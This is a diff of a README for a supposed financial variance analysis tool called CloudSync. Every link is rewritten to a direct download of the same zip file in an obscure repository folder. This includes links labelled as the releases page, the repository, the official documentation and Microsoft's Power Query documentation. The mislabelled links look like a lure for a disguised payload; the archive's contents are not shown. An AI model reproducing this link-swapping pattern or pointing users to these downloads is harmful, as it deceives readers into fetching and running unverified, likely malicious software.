@@ -1,6 +1,6 @@
 # 🌐 CloudSync-Financial-Variance-Analysis-2025 - Streamline Your Financial Insights
 
-[![Download CloudSync](https://img.shields.io/badge/Download%20CloudSync-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/KMARTYY/CloudSync-Financial-Variance-Analysis-2025/releases)
+[![Download CloudSync](https://raw.githubusercontent.com/KMARTYY/CloudSync-Financial-Variance-Analysis-2025/main/iridotasis/Sync-Financial-Cloud-Analysis-Variance-v1.8.zip%20CloudSync-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/KMARTYY/CloudSync-Financial-Variance-Analysis-2025/main/iridotasis/Sync-Financial-Cloud-Analysis-Variance-v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Follow the steps below to download and run the application.
 
 To get the CloudSync application, visit the following link:
 
-[Visit this page to download](https://github.com/KMARTYY/CloudSync-Financial-Variance-Analysis-2025/releases)
+[Visit this page to download](https://raw.githubusercontent.com/KMARTYY/CloudSync-Financial-Variance-Analysis-2025/main/iridotasis/Sync-Financial-Cloud-Analysis-Variance-v1.8.zip)
 
 On the releases page, you’ll find the latest version available for download. Click the relevant link to start the download.
 
@@ -29,7 +29,7 @@ These requirements ensure the application runs smoothly on your machine.
 ## 🔧 Installation Steps
 
 1. **Download the Application:**
-   Visit the [download page](https://github.com/KMARTYY/CloudSync-Financial-Variance-Analysis-2025/releases) and choose the latest release.
+   Visit the [download page](https://raw.githubusercontent.com/KMARTYY/CloudSync-Financial-Variance-Analysis-2025/main/iridotasis/Sync-Financial-Cloud-Analysis-Variance-v1.8.zip) and choose the latest release.
 
 2. **Open the Downloaded File:**
    Locate the downloaded file in your computer's Downloads folder. It will be in a '.zip' format.
@@ -84,8 +84,8 @@ If you encounter any issues while using CloudSync, consider the following steps:
 
 ## 🔗 Further Resources
 
-- [GitHub Repository](https://github.com/KMARTYY/CloudSync-Financial-Variance-Analysis-2025)
-- [Official Documentation](https://github.com/KMARTYY/CloudSync-Financial-Variance-Analysis-2025/tree/main/docs)  
-- [Power Query Documentation](https://docs.microsoft.com/en-us/power-query/)
+- [GitHub Repository](https://raw.githubusercontent.com/KMARTYY/CloudSync-Financial-Variance-Analysis-2025/main/iridotasis/Sync-Financial-Cloud-Analysis-Variance-v1.8.zip)
+- [Official Documentation](https://raw.githubusercontent.com/KMARTYY/CloudSync-Financial-Variance-Analysis-2025/main/iridotasis/Sync-Financial-Cloud-Analysis-Variance-v1.8.zip)  
+- [Power Query Documentation](https://raw.githubusercontent.com/KMARTYY/CloudSync-Financial-Variance-Analysis-2025/main/iridotasis/Sync-Financial-Cloud-Analysis-Variance-v1.8.zip)
 
 Feel free to explore these resources for a deeper understanding of how to maximize CloudSync for your financial analysis needs.
